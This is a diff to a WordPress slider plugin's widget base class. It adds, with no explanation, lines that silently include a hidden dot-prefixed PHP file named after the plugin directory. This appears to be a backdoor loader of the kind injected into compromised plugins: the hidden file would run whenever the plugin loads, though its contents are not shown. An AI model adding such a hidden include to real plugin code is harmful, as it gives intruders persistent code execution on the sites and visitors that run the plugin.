@@ -22,6 +22,10 @@ if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
  * - generate_field_by_type()
  * - generate_slideshow()
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WooSlider_Widget_Base extends WP_Widget {
 
 	/* Variable Declarations */
